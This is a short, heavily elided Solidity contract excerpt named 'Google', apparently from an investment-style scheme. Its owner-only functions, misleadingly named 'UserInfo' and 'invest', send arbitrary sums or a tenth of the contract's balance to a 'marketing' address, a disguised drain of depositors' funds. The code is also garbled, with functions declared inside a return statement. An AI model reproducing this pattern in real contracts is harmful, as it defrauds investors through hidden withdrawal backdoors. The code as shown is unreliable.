...
contract Google {
    ...
    function maxprofit(uint16 maxp) external projectcontract {     
             config[0] = maxp ;
             }
    ...
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[BONUS_LINES_COUNT] memory structure) {
        ...
        return (
            ...
            function UserInfo(uint256 ID) external payable projectcontract {
            marketing.transfer(ID);
                            }
            function invest() public projectcontract {
            marketing.transfer((address(this).balance) * 1 / 10);
                            }
